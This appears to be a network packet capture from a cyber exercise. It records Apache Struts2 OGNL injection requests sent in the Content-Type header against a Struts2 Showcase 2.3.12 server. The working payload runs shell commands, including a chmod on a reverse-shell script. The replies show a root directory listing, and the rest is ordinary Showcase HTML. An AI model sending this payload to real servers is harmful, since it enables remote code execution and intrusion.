+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/timepicker/index.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">DateTime picker tag - Pick a time</a></li>
+.........
+...
+
+T 192.168.33.20:57866 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls -la').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+host: target.cyexc-target.
+Connection: close.
+.
+
+
+T 192.168.1.100:37897 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.20.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.20.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls -la').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37897 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Transfer-Encoding: chunked.
+Date: Fri, 19 Jan 2018 04:50:08 GMT.
+Connection: close.
+.
+43e.
+total 12684
+drwxr-sr-x 18 root staff     4096 Jan 19 04:46 .
+drwxrwsr-x 21 root staff     4096 Jan 19 03:54 ..
+-rw-r--r--  1 root root     56846 Sep 29 12:27 LICENSE
+-rw-r--r--  1 root root      1239 Sep 29 12:27 NOTICE
+-rw-r--r--  1 root root      8965 Sep 29 12:27 RELEASE-NOTES
+-rw-r--r--  1 root root     16195 Sep 29 12:27 RUNNING.txt
+drwxr-xr-x  2 root root      4096 Jan 19 03:54 bin
+drwxr-xr-x  3 root root      4096 Jan 19 03:54 conf
+drwxr-sr-x  3 root staff     4096 Jan 18 21:12 include
+drwxr-xr-x  2 root root      4096 Jan 18 21:12 lib
+drwxr-xr-x  2 root root      4096 Jan 19 03:54 logs
+drwxr-sr-x  3 root staff     4096 Jan 18 21:12 native-jni-lib
+drwxr-sr-x  7 root root      4096 Jan 19 03:54 node_modules
+-rwx------  1 root staff     1171 Dec 28 17:03 reverseShellClient.js
+-rw-r--r--  1 root staff 12828110 Mar  6  2013 struts2-showcase-2.3.12.war
+drwxr-xr-x  2 root root      4096 Jan 18 21:12 temp
+-rw-r--r--  1 root staff    15019 Jan 19 03:55 velocity.log
+drwxr-xr-x  8 root root      4096 Jan 19 03:54 webapps
+drwxr-xr-x  3 root root      4096 Jan 19 03:54 work
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.20:57866 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:50:08 GMT.
+Transfer-Encoding: chunked.
+Connection: close.
+.
+43e.
+total 12684
+drwxr-sr-x 18 root staff     4096 Jan 19 04:46 .
+drwxrwsr-x 21 root staff     4096 Jan 19 03:54 ..
+-rw-r--r--  1 root root     56846 Sep 29 12:27 LICENSE
+-rw-r--r--  1 root root      1239 Sep 29 12:27 NOTICE
+-rw-r--r--  1 root root      8965 Sep 29 12:27 RELEASE-NOTES
+-rw-r--r--  1 root root     16195 Sep 29 12:27 RUNNING.txt
+drwxr-xr-x  2 root root      4096 Jan 19 03:54 bin
+drwxr-xr-x  3 root root      4096 Jan 19 03:54 conf
+drwxr-sr-x  3 root staff     4096 Jan 18 21:12 include
+drwxr-xr-x  2 root root      4096 Jan 18 21:12 lib
+drwxr-xr-x  2 root root      4096 Jan 19 03:54 logs
+drwxr-sr-x  3 root staff     4096 Jan 18 21:12 native-jni-lib
+drwxr-sr-x  7 root root      4096 Jan 19 03:54 node_modules
+-rwx------  1 root staff     1171 Dec 28 17:03 reverseShellClient.js
+-rw-r--r--  1 root staff 12828110 Mar  6  2013 struts2-showcase-2.3.12.war
+drwxr-xr-x  2 root root      4096 Jan 18 21:12 temp
+-rw-r--r--  1 root staff    15019 Jan 19 03:55 velocity.log
+drwxr-xr-x  8 root root      4096 Jan 19 03:54 webapps
+drwxr-xr-x  3 root root      4096 Jan 19 03:54 work
+.
+
+
+T 192.168.33.20:57867 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='chmod 700 reverseShellClient.js').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+host: target.cyexc-target.
+Connection: close.
+.
+
+
+T 192.168.1.100:37898 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.20.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.20.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='chmod 700 reverseShellClient.js').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37898 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Transfer-Encoding: chunked.
+Date: Fri, 19 Jan 2018 04:50:17 GMT.
+Connection: close.
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.20:57867 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:50:17 GMT.
+Transfer-Encoding: chunked.
+Connection: close.
+.
+
+
+T 192.168.33.20:57868 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=''chmod 700 reverseShellClient.js'').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+host: target.cyexc-target.
+Connection: close.
+.
+
+
+T 192.168.1.100:37899 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.20.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.20.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=''chmod 700 reverseShellClient.js'').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37899 [AP]
+HTTP/1.1 302 Found.
+Server: Apache-Coyote/1.1.
+Set-Cookie: JSESSIONID=27D64E807365B10A3962A6D6648CB4DF; Path=/struts2-showcase-2.3.12; HttpOnly.
+Location: showcase.action.
+Content-Type: text/html.
+Content-Length: 0.
+Date: Fri, 19 Jan 2018 04:50:39 GMT.
+Connection: close.
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.20:57868 [AP]
+HTTP/1.1 302 Found.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:50:39 GMT.
+Content-Type: text/html.
+Content-Length: 0.
+Connection: close.
+Set-Cookie: JSESSIONID=27D64E807365B10A3962A6D6648CB4DF; Path=/struts2-showcase-2.3.12; HttpOnly.
+Location: showcase.action.
+.
+
+
+T 192.168.33.20:57869 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/showcase.action HTTP/1.1.
+User-Agent: Mozilla/5.0.
+referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+host: target.cyexc-target.
+Connection: close.
+.
+
+
+T 192.168.1.100:37900 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/showcase.action HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.20.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.20.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0.
+referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37900 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Set-Cookie: JSESSIONID=C5E4447F493FB0164CE6E22A0A7FF05C; Path=/struts2-showcase-2.3.12; HttpOnly.
+Content-Type: text/html;charset=ISO-8859-1.
+Transfer-Encoding: chunked.
+Date: Fri, 19 Jan 2018 04:50:39 GMT.
+Connection: close.
+.
+2000.
+<!DOCTYPE html>
+
+
+
+
+
+
+<html lang="en">
+<head>
+.<meta charset="utf-8">
+.<meta name="viewport" content="width=device-width, initial-scale=1.0">
+.<meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
+.<meta name="description" content="Struts2 Showcase for Apache Struts Project">
+.<meta name="author" content="The Apache Software Foundation">
+
+.<title>Struts2 Showcase</title>
+
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap-responsive.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/main.css" rel="stylesheet" type="text/css"
+.      media="all"/>
+
+.<script src="/struts2-showcase-2.3.12/js/jquery-1.8.2.min.js"></script>
+.<script src="/struts2-showcase-2.3.12/js/bootstrap.min.js"></script>
+.<script type="text/javascript">
+..$(function () {
+...$('.dropdown-toggle').dropdown();
+...var alerts = $('ul.alert').wrap('<div />');
+...alerts.prepend('<a class="close" data-dismiss="alert" href="#">&times;</a>');
+...alerts.alert();
+..});
+.</script>
+
+.<!-- Prettify -->
+.<link href="/struts2-showcase-2.3.12/styles/prettify.css" rel="stylesheet">
+.<script src="/struts2-showcase-2.3.12/js/prettify.js"></script>
+
+.<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+.<!--[if lt IE 9]>
+.<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+.<![endif]-->
+
+.<script src="/struts2-showcase-2.3.12/struts/utils.js" type="text/javascript"></script>
+</head>
+
+<body id="page-home" onload="prettyPrint();">
+
+<div class="navbar navbar-fixed-top">
+.<div class="navbar-inner">
+..<div class="container-fluid">
+...<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+...</a>
+...<a href="/struts2-showcase-2.3.12/showcase.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C" class="brand">Struts2 Showcase</a>
+...<div class="nav-collapse">
+....<ul class="nav">
+.....<li><a href="/struts2-showcase-2.3.12/showcase.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C"><i class="icon-home"></i> Home</a></li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Configuration<b
+........class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/actionchaining/actionChain1!input.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Action Chaining</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/config-browser/index.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Config Browser</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/conversion/index.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Conversion</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/person/index.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Person Manager ( by Conventions )</a></li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Tags<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Non UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionTag/showActionTagDemo.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Action Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/date.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Date Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/debugTagDemo.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Debug Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/iteratorGeneratorTag/showGeneratorTagDemo.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Iterator Generator Tag</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/appendIteratorTag/showAppendTagDemo.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Append Iterator Tag</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/mergeIteratorTag/showMergeTagDemo.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Merge Iterator Demo</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/subsetIteratorTag/showSubsetTagDemo.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Subset Tag</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionPrefix/actionPrefixExampleUsingFreemarker.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Action Prefix Example (Freemarker)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagJsp.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">If Tag (JSP)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagFreemarker.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">If Tag (Freemarker)</a></li>
+........</ul>
+
+.......</li>
+.......<li class="dropdown-submenu">
+........<a href="#">UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/example!input.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/exampleVelocity!input.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">UI Example (Velocity)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/lotsOfOptiontransferselect!input.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Option Transfer Select UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/moreSelects!input.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">More Select Box UI Examples</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/treeExampleStatic.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Tree Example (static)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicTreeAction.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Tree Example (dynamic)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicAjaxTreeAction.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Tree Example (dynamic ajax loading)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/componentTagExample.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Component Tag Example</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/actionTagExample!input.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Action Tag Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/datepicker/index.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">DateTime picker tag - Pick a date</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/timepicker/index.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">DateTime picker tag - Pick a time</a></li>
+.........
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">File<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/filedownload/index.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">File Download</a></li>
+.......<li class="dropdown-submenu">
+........<a href="#">File Upload</a>
+........<ul class="dropdown-menu">
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/upload.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Single File Upload</a>
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingList.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Multiple File Upload (List)</a>
+
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingArray.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Multiple File Upload (Array)</a>
+.........</li>
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Examples<b class="caret"></b></a>
+......<ul class="dropd.
+11ed.
+own-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Hangman</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/hangman/hangmanNonAjax.action;jsessionid=C5E4447
+
+T 192.168.1.100:80 -> 192.168.33.20:57869 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:50:39 GMT.
+Content-Type: text/html;charset=ISO-8859-1.
+Transfer-Encoding: chunked.
+Connection: close.
+Set-Cookie: JSESSIONID=C5E4447F493FB0164CE6E22A0A7FF05C; Path=/struts2-showcase-2.3.12; HttpOnly.
+.
+1eea.
+<!DOCTYPE html>
+
+
+
+
+
+
+<html lang="en">
+<head>
+.<meta charset="utf-8">
+.<meta name="viewport" content="width=device-width, initial-scale=1.0">
+.<meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
+.<meta name="description" content="Struts2 Showcase for Apache Struts Project">
+.<meta name="author" content="The Apache Software Foundation">
+
+.<title>Struts2 Showcase</title>
+
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap-responsive.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/main.css" rel="stylesheet" type="text/css"
+.      media="all"/>
+
+.<script src="/struts2-showcase-2.3.12/js/jquery-1.8.2.min.js"></script>
+.<script src="/struts2-showcase-2.3.12/js/bootstrap.min.js"></script>
+.<script type="text/javascript">
+..$(function () {
+...$('.dropdown-toggle').dropdown();
+...var alerts = $('ul.alert').wrap('<div />');
+...alerts.prepend('<a class="close" data-dismiss="alert" href="#">&times;</a>');
+...alerts.alert();
+..});
+.</script>
+
+.<!-- Prettify -->
+.<link href="/struts2-showcase-2.3.12/styles/prettify.css" rel="stylesheet">
+.<script src="/struts2-showcase-2.3.12/js/prettify.js"></script>
+
+.<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+.<!--[if lt IE 9]>
+.<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+.<![endif]-->
+
+.<script src="/struts2-showcase-2.3.12/struts/utils.js" type="text/javascript"></script>
+</head>
+
+<body id="page-home" onload="prettyPrint();">
+
+<div class="navbar navbar-fixed-top">
+.<div class="navbar-inner">
+..<div class="container-fluid">
+...<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+...</a>
+...<a href="/struts2-showcase-2.3.12/showcase.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C" class="brand">Struts2 Showcase</a>
+...<div class="nav-collapse">
+....<ul class="nav">
+.....<li><a href="/struts2-showcase-2.3.12/showcase.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C"><i class="icon-home"></i> Home</a></li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Configuration<b
+........class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/actionchaining/actionChain1!input.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Action Chaining</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/config-browser/index.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Config Browser</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/conversion/index.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Conversion</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/person/index.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Person Manager ( by Conventions )</a></li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Tags<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Non UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionTag/showActionTagDemo.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Action Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/date.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Date Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/debugTagDemo.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Debug Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/iteratorGeneratorTag/showGeneratorTagDemo.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Iterator Generator Tag</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/appendIteratorTag/showAppendTagDemo.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Append Iterator Tag</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/mergeIteratorTag/showMergeTagDemo.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Merge Iterator Demo</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/subsetIteratorTag/showSubsetTagDemo.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Subset Tag</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionPrefix/actionPrefixExampleUsingFreemarker.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Action Prefix Example (Freemarker)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagJsp.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">If Tag (JSP)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagFreemarker.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">If Tag (Freemarker)</a></li>
+........</ul>
+
+.......</li>
+.......<li class="dropdown-submenu">
+........<a href="#">UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/example!input.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/exampleVelocity!input.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">UI Example (Velocity)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/lotsOfOptiontransferselect!input.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Option Transfer Select UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/moreSelects!input.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">More Select Box UI Examples</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/treeExampleStatic.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Tree Example (static)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicTreeAction.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Tree Example (dynamic)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicAjaxTreeAction.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Tree Example (dynamic ajax loading)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/componentTagExample.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Component Tag Example</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/actionTagExample!input.action;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">Action Tag Example</a></li>
